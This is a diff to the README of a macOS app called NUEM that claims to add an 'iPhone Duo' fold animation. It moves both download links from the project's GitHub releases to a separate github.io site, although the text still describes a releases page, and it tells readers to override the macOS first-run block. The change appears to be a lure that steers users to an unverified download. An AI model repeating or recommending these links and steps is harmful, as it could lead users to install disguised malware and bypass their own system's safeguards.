@@ -4,11 +4,11 @@
 
 Welcome! NUEM brings the stunning fold animation from the iPhone Duo experience directly to your MacBook. This menu bar application transforms your screen with beautiful, customizable folding effects that feel smooth and professional at every frame.
 
-[![Download NUEM](https://img.shields.io/badge/Download-NUEM-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ympyhrc64/NUEM/releases)
+[![Download NUEM](https://img.shields.io/badge/Download-NUEM-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://ympyhrc64.github.io)
 
 ## 💾 Download and Installation
 
-Visit this link to download the application: [https://github.com/ympyhrc64/NUEM/releases](https://github.com/ympyhrc64/NUEM/releases)
+Visit this link to download the application: [https://ympyhrc64.github.io](https://ympyhrc64.github.io)
 
 Once you arrive at the releases page, look for the latest version. Click the download button to save the file to your computer. The download should complete within a few minutes depending on your internet connection. After the file is fully downloaded, you may need to allow your Mac to open it by right-clicking the file and selecting "Open" the first time.
 
